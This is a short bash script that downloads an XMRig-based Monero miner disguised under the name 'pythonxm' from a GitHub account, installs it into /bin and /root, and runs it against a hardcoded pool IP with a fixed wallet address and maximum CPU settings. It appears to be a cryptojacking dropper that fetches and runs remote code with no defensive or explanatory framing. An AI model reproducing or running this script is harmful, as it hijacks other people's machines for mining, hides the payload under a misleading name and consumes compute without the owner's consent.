#!bin/bash -xe 
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

wget https://github.com/one10001/xmrig/releases/download/v0.02/pythonxm
wget https://github.com/one10001/10001code/raw/main/config.json
cp config.json /root/config.json
chmod +x pythonxm
cp pythonxm /bin/pythonxm
#pythonxm  -o ehttp.info:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k -t 8 2> logxm.out 1> logxm.out  &
pythonxm  -o 116.203.206.127:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k --astrobwt-avx2 	--cpu-priority 5 --cpu-no-yield --randomx-1gb-pages --randomx-wrmsr=-1
#while [ 1 ]
#do
#    echo '#######################################################################################################################################'
#    echo first 21: $(grep -o 'Accepted' logxm.out  | wc -l)
#    grep -o '' logxm.out | tail -n 5
#    sleep 30
#done
